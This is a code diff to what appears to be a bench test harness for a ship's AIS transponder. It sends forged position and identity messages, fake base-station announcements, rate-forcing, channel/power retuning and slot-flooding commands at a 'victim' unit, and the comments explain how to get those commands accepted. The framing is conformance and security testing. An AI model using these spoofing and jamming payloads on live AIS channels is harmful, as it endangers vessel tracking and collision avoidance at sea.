@@ -153,6 +153,20 @@ def build_timeline(ctx):
         [(enc.encode_type1(V, *offset_position(vlat, vlon, 45, 30000), sog=40.0, cog=225.0),
           f"Type1 spoofing the victim's OWN MMSI {V} at a distinct position (30km NE)")]))
 
+    # --- forged static/voyage identity (Type 5): spoof a vessel's name, call sign, and type.
+    # Two variants: (1) a ghost identity, and (2) a Type 5 claiming the VICTIM's own MMSI with a
+    # DIFFERENT name/type, to test whether the unit accepts conflicting static data for its own
+    # identity. NOTE: Type 5 is 424 bits (a multi-slot message); it is sent as one payload here,
+    # which the ais-simulator transmits as a single burst -- verify on the bench that the backend
+    # accepts >168-bit payloads (it modulates raw bits, so it should).
+    tl.append(("forge_static_identity",
+        [(enc.encode_type5_static(366000005, callsign="FAKE1",
+                                  shipname="GHOST VESSEL", shiptype=70),
+          "M5 forged static/voyage data for a ghost identity"),
+         (enc.encode_type5_static(V, callsign="SPOOF",
+                                  shipname="NOT REAL NAME", shiptype=35),
+          f"M5 forged static data claiming the victim's MMSI {V}")]))
+
     # --- command / control (addressed to the victim) ---
     tl.append(("interrogation",
         [(enc.encode_type15(366000001, V, msg1_1=5), f"M15 interrogate victim {V}")]))
@@ -161,9 +175,13 @@ def build_timeline(ctx):
     tl.append(("auto_ack",
         [(enc.encode_type6(366000001, V, dac=1, fid=0, app_data_bits="0"*40),
           f"M6 addressed to victim {V}")]))
+    # M16 rate assignment: increment=0, offset=reports/10min (600 = force MAX rate). A Class A
+    # takes the HIGHER of assigned vs autonomous, so this forces OVER-reporting, not silence.
+    # (phase-1 source is a regular ship with no base announced, so a conforming unit should
+    # ignore it -- the base-authority version is tested properly in phase 3.)
     tl.append(("rate_assignment",
-        [(enc.encode_type16(366000001, V, offset_a=0, increment_a=0),
-          f"M16 near-silence to {V}")]))
+        [(enc.encode_type16(366000001, V, offset_a=600, increment_a=0),
+          f"M16 force max reporting rate to {V}")]))
     tl.append(("channel_mgmt",
         [(enc.encode_type22(366000001, addressed=1, dest1=V, power=1),
           f"M22 channel/power to {V}")]))
@@ -265,12 +283,14 @@ def build_phase2(ctx):
             [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A, channel_b=AIS_CH_B),
               "M22 from BASE: RECOVERY -> restore DY to AIS channels 2087/2088")]))
 
-    # 4) illegal reporting rate vs speed: GPS is set FAST (handled in main by moving
-    #    the victim), but we ASSIGN a slow report interval via M16 -> non-compliant.
-    #    (ITU-R M.1371 requires faster reporting at higher speed; this violates it.)
-    p2.append(("p2_illegal_rate_for_speed",
-        [(p3enc.m16_assignment(BASE_MMSI, V, offset=0, increment=1125),
-          "M16 from BASE: assign SLOW rate while DY moves FAST (illegal combo)")]))
+    # 4) force MAX reporting rate. NOTE: a Class A takes the HIGHER of assigned vs autonomous
+    #    rate (M.1371-5 Table 67), so M16 cannot SILENCE a Class A -- it can only force it to
+    #    OVER-report. Assigning 600 reports/10 min to an otherwise-slow (anchored) unit is the
+    #    observable, abusable effect (airtime/slot consumption). The old test tried to assign a
+    #    slow rate (which the unit correctly ignores) with an invalid increment (also ignored).
+    p2.append(("p2_force_fast_rate",
+        [(p3enc.m16_rate_assignment(BASE_MMSI, V, 600),
+          "M16 from BASE: force MAX reporting rate (600/10min) -> over-report")]))
 
     # 5) timing / slot overload -- reserve large slot blocks (FATDMA hogging)
     p2.append(("p2_slot_overload",
@@ -285,37 +305,53 @@ def build_phase2(ctx):
         [(enc.encode_type1(366000900 + i, vlat, vlon, sog=0.0), f"collision flood {i}")
          for i in range(8)]))
 
+    # ESTABLISH THE BASE STATION. Management messages (M16/M20/M22) are base-station functions;
+    # ITU-R M.1371-5 says a Message 20 "without a base station report (Message 4) should be
+    # ignored", and the assignment/channel-management functions likewise expect an established
+    # base. So we prefix every management cell with Message 4 bursts announcing BASE_MMSI as a
+    # real base at the victim's location. Without this the earlier run's channel/rate/slot
+    # commands were correctly ignored -- a test artifact, not unit behavior. The TDMA flood is
+    # ordinary Type-1 traffic and needs no base context.
+    m4 = (p3enc.m4_base_report(BASE_MMSI, vlat, vlon), "M4: announce base station")
+    p2 = [(n, ([m4, m4] + pl) if "tdma" not in n else pl) for (n, pl) in p2]
+
     return p2
 
 
-# Phase 3: SOURCE-AUTHORITY MATRIX.
-# ITU-R M.1371 intends the management messages (assignment M16, channel management M22,
-# data-link-management M20) to originate from base stations. A conforming Class A unit
-# should therefore honor them from a base station and ignore them from an ordinary ship
-# station. This phase sends each such command TWICE: once from a valid base-station MMSI
-# and once from a regular ship MMSI, so the analysis can compare the two and determine,
-# per command, whether the unit checks the source authority or acts on the command
-# regardless of who sent it. Interrogation (M15) and addressed binary (M6) are included
-# because a unit that answers/acknowledges them from any source is itself a finding.
+# Phase 3: SOURCE-AUTHORITY MATRIX (corrected against ITU-R M.1371-5).
 #
-# Each cell is fired with a long dwell (set by --phase3-gap, default large) so slow
-# effects (a reporting-rate change, a retune) have time to appear, and every cell is
-# tagged in the manifest with source=base|regular and command=<Mxx> for a clean 2xN table.
+# The management messages (assignment M16, data-link M20, channel management M22) are
+# BASE-STATION functions. The spec states a Message 20 received "without a base station
+# report (Message 4) should be ignored", and M16/M22 likewise operate within an established
+# base's cell. So this phase FIRST announces a real base station (Message 4 from BASE_MMSI at
+# the victim's location) and keeps it present in every management cell, THEN issues the
+# command. The source-authority question is then clean: with a legitimate base present, does
+# the unit act on the same command from the BASE vs from a REGULAR ship? A conforming unit
+# obeys only the base; one that also obeys the regular ship fails the check.
+#   (Without the M4 the earlier run's M16/M20/M22 were correctly ignored -- a test artifact,
+#    not a real "ignores base commands" result.)
+#
+# Interrogation (M15) and addressed binary (M6) are handled SEPARATELY: the spec REQUIRES a
+# unit to answer M15 (Sec 4.3.3.3.3: "should automatically respond ... from an AIS station")
+# and to acknowledge M6 (transport layer) from ANY source. A response there is spec-COMPLIANT
+# -- the finding is forced-response / amplification, not a source-authority failure. They
+# carry no M4 and the analyzer buckets them apart.
+#
+# M16 semantics (Table 67): a Class A takes the HIGHER of the assigned and autonomous rate, so
+# M16 can only force FASTER reporting. We assign the MAX rate (600/10 min); "success" = the
+# unit's transmit rate jumps above baseline. (Assigning a slow rate, as the old test did, is
+# correctly ignored -- and the old increment=1000 was an undefined code, ignored regardless.)
 def build_phase3(ctx):
     V = ctx.victim_mmsi
+    blat, blon = ctx.victim_lat, ctx.victim_lon
+    m4 = (p3enc.m4_base_report(BASE_MMSI, blat, blon), "M4: announce base station")
     cells = []
 
-    # Phase-3 messages use the pyais-validated encoders in ais_encode_p3, so the addressed
-    # flag / destination fields are spec-correct (the hand-rolled Type 22 put the addressed
-    # flag in the wrong position, sending channel commands as broadcast). builder(src) fires
-    # the identical command from a given source MMSI.
-    commands = [
-        ("M15_interrogation",
-         lambda src: p3enc.m15_interrogation(src, V, req_type=5),
-         "M15 interrogate victim (request Type5)"),
-        ("M16_rate_assignment",
-         lambda src: p3enc.m16_assignment(src, V, offset=0, increment=1000),
-         "M16 assign slow reporting rate to victim"),
+    # (A) SOURCE-AUTHORITY: real management commands, base announced (M4) throughout each cell
+    mgmt = [
+        ("M16_rate_fast",
+         lambda src: p3enc.m16_rate_assignment(src, V, 600),
+         "M16 force MAX reporting rate (600/10min)"),
         ("M20_slot_reservation",
          lambda src: p3enc.m20_datalink(src, offset=100, number=10, timeout=7),
          "M20 reserve 10 slots"),
@@ -325,25 +361,36 @@ def build_phase3(ctx):
         ("M22_power_low",
          lambda src: p3enc.m22_channel(src, V, channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=1),
          "M22 set victim to LOW power"),
+    ]
+    for label, builder, meta in mgmt:
+        cells.append((f"p3_{label}_base",
+                      [m4, m4, (builder(BASE_MMSI), f"[SRC=BASE {BASE_MMSI:07d}] {meta}")]))
+        cells.append((f"p3_{label}_regular",
+                      [m4, m4, (builder(REGULAR_MMSI), f"[SRC=REGULAR {REGULAR_MMSI}] {meta}")]))
+        if label.startswith("M22") or label.startswith("M16"):
+            cells.append((f"p3_recover_after_{label}",
+                          [m4,
+                           (p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A,
+                                              channel_b=AIS_CH_B, power=0),
+                            "RECOVERY: restore AIS channels + high power"),
+                           (p3enc.m16_rate_assignment(BASE_MMSI, V, 20),
+                            "RECOVERY: release rate (autonomous wins; self-times-out)")]))
+
+    # (B) MANDATORY-RESPONSE: responding is spec-required from ANY source -- not authority.
+    #     Kept for the amplification/forced-response finding; no M4 (they need no base context).
+    respond = [
+        ("M15_interrogation",
+         lambda src: p3enc.m15_interrogation(src, V, req_type=5),
+         "M15 interrogate victim (response is MANDATORY per spec)"),
         ("M6_addressed_ack",
          lambda src: p3enc.m6_addressed(src, V, dac=1, fid=0),
-         "M6 addressed binary to victim (expect ack)"),
+         "M6 addressed binary (ack is MANDATORY per spec)"),
     ]
-
-    # For each command, emit the base-station variant then the regular-ship variant.
-    for label, builder, meta in commands:
+    for label, builder, meta in respond:
         cells.append((f"p3_{label}_base",
                       [(builder(BASE_MMSI), f"[SRC=BASE {BASE_MMSI:07d}] {meta}")]))
         cells.append((f"p3_{label}_regular",
                       [(builder(REGULAR_MMSI), f"[SRC=REGULAR {REGULAR_MMSI}] {meta}")]))
-        # recovery after the reconfiguring commands so a success does not distort later cells
-        if label.startswith("M22") or label.startswith("M16"):
-            cells.append((f"p3_recover_after_{label}",
-                          [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A,
-                                              channel_b=AIS_CH_B, power=0),
-                            "RECOVERY: restore AIS channels + high power"),
-                           (p3enc.m16_assignment(BASE_MMSI, V, offset=0, increment=0),
-                            "RECOVERY: clear rate assignment (autonomous mode)")]))
 
     return cells
 
@@ -463,18 +510,9 @@ def main():
             print("     slot/TDMA overload -- may disrupt the transponder)\n")
             rec(event="phase2_start", n=len(p2), gap=args.phase2_gap)
             for i, (name, payloads) in enumerate(p2):
-                # for the illegal-rate test, drive the victim FAST first so the
-                # assigned slow rate genuinely violates the speed/rate rule
-                if name == "p2_illegal_rate_for_speed":
-                    gps.set_position(ctx.victim_lat, ctx.victim_lon,
-                                     speed=args.fast_speed, course=90.0)
-                    rec(event="victim_speed_set", speed=args.fast_speed,
-                        note="fast so assigned slow rate is illegal")
-                    print(f"    (victim speed set to {args.fast_speed}kn for illegal-rate test)")
-                    time.sleep(5)   # let a few fast reports go out before the M16
+                # p2_force_fast_rate is run with the victim ANCHORED (slow autonomous rate),
+                # so if the unit obeys the M16 its transmit rate jumps visibly above baseline.
                 fire(name, payloads, i, len(p2), tag="P2:")
-                if name == "p2_illegal_rate_for_speed":
-                    gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=0.0)  # back to static
                 if i < len(p2) - 1:
                     # recovery commands follow their retune attempt QUICKLY (short gap)
                     # so DY is not left off-channel for a full gap; other tests use the
@@ -493,8 +531,7 @@ def main():
             for _ in range(3):
                 ws.send(p3enc.m22_channel(BASE_MMSI, args.victim_mmsi,
                                           channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=0))
-                ws.send(p3enc.m16_assignment(BASE_MMSI, args.victim_mmsi,
-                                             offset=0, increment=0))
+                ws.send(p3enc.m16_rate_assignment(BASE_MMSI, args.victim_mmsi, 20))
                 rec(event="final_recovery", meta="restore AIS channels + high power + rate")
                 time.sleep(1)
 
@@ -529,8 +566,7 @@ def main():
             for _ in range(3):
                 ws.send(p3enc.m22_channel(BASE_MMSI, args.victim_mmsi,
                                           channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=0))
-                ws.send(p3enc.m16_assignment(BASE_MMSI, args.victim_mmsi,
-                                             offset=0, increment=0))
+                ws.send(p3enc.m16_rate_assignment(BASE_MMSI, args.victim_mmsi, 20))
                 rec(event="final_recovery", meta="restore channels/power/rate after phase3")
                 time.sleep(1)
     except KeyboardInterrupt:
